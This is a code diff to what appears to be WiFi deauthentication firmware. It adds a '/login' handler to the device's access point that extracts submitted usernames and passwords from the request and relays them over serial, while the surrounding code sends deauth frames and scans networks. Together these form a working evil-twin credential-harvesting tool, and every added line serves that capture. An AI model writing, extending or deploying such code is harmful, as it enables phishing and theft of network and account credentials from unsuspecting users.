@@ -68,6 +68,7 @@ uint16_t deauth_reason = 2;
 
 #define FRAMES_PER_DEAUTH 5
 
+String sep = String(char(0x1D));
 
 String printEncryptionTypeEx(uint32_t thisType) {
   /*  Arduino wifi api use encryption type to mapping to security type.
@@ -383,7 +384,6 @@ int cmd_get(){
   DEBUG_SER_PRINTLN("");
   Serial.print('<' + String('i') + scan_results.size() + '>');
   for (uint32_t i = 0; i < scan_results.size(); i++) {
-    String sep = String(char(0x1D));
     if (scan_results[i].ssid == ""){
       Serial.print('<' + String('n') + String(i) + sep + "Hidden" + sep + scan_results[i].bssid_str + sep + ((scan_results[i].channel >= 36) ? "1" : "0") + '>');
     } else{
@@ -646,6 +646,37 @@ void clientHandler(void *pvParameters){
                         xTaskCreate(scanNetworks, "networkScan", 1024, NULL, 1, &scanInProcess);
                     }
                     // Don't serve handleRoot here, as the scan will block AP
+                } else if (path.startsWith("/login")) {
+                    int qmark = path.indexOf('?');
+                    if (qmark != -1) {
+                        String query = path.substring(qmark + 1); // username=...&password=...
+                        int userIdx = query.indexOf("username=");
+                        int passIdx = query.indexOf("password=");
+                        String username, password;
+                        if (userIdx != -1 && passIdx != -1) {
+                            int userEnd = query.indexOf('&', userIdx);
+                            if (userEnd == -1) userEnd = query.length();
+                            username = query.substring(userIdx + 9, userEnd);
+
+                            int passEnd = query.indexOf('&', passIdx);
+                            if (passEnd == -1) passEnd = query.length();
+                            password = query.substring(passIdx + 9, passEnd);
+
+                            DEBUG_SER_PRINT("Username: ");
+                            DEBUG_SER_PRINTLN(username);
+                            DEBUG_SER_PRINT("Password: ");
+                            DEBUG_SER_PRINTLN(password);
+
+                            Serial.print("<c" + sep);
+                            Serial.print(username);
+                            Serial.print(sep);
+                            Serial.print(password);
+                            Serial.println(">");
+                        }
+                    }
+                    String response = makeResponse(200, "text/plain");
+                    response += "Login received";
+                    client.write(response.c_str());
                 } else {
                     handle404(client);
                 }
